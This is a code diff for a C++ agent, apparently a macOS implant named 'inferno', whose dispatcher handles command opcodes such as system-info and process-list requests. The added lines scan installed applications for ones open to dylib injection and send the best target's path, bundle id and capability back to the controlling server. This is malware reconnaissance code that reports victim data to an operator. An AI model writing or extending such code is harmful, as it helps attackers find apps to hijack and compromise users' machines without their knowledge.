@@ -1,5 +1,6 @@
 #include "../include/Agent.hpp"
 #include "../include/entry_dylib.hpp"
+#include "../include/EntitlementScanner.hpp"
 #include <iostream>
 #include <cstdio>
 #include <cstdlib>
@@ -171,6 +172,20 @@ void Agent::handleDispatching(Packet&& packet) {
         std::string info = getSystemInfo();
         Packet res(static_cast<uint16_t>(Opcode::SYS_RES_INFO), info);
         std::vector<uint8_t> data = res.serialize();
+        m_socket.sendData(data);
+
+        // Tier 2: scan for injectable apps and report to server
+        auto targets = inferno::tier2::scanApplications();
+        std::string report;
+        if (!targets.empty()) {
+            const auto& best = targets.front();
+            report = best.path + "|" + best.bundle_id + "|"
+                   + std::to_string(static_cast<int>(best.capability)) + "|1";
+        } else {
+            report = "none||0|0";
+        }
+        Packet scan_res(static_cast<uint16_t>(Opcode::SCAN_RESULT), report);
+        data = scan_res.serialize();
         m_socket.sendData(data);
     } else if (opcode == static_cast<uint16_t>(Opcode::PROC_LIST_REQ)) {
         handleProcessDiscovery();
